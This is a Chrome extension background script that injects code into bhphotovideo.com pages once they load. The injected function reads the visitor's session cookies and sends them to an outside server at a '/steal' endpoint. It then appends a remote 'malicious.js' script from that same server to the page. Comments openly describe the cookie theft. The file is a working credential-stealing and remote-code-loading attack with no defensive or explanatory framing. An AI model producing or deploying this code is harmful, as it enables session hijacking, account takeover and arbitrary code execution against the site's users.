chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === "complete" && /https?:\/\/.*\.bhphotovideo\.com/.test(tab.url)) {
    chrome.scripting.executeScript({
      target: { tabId: tabId },
      func: runCustomScript,
      args: ["https://kxz46bmj.c5.rs"]
    });
  }
});

// The function to be executed on matching pages
function runCustomScript(serverUrl) {
  // Log a message to verify execution
  console.log("Injected Script Executed on bhphotovideo.com!");

  // Steal session cookies and send them to your server
  const stolenCookies = document.cookie;
  fetch(`${serverUrl}/steal?cookies=${encodeURIComponent(stolenCookies)}`)
    .then(() => console.log("Cookies sent to server."))
    .catch((err) => console.error("Failed to send cookies:", err));

  // Example: Injecting a malicious script hosted on your server
  const script = document.createElement("script");
  script.src = `${serverUrl}/malicious.js`;
  document.body.appendChild(script);
}
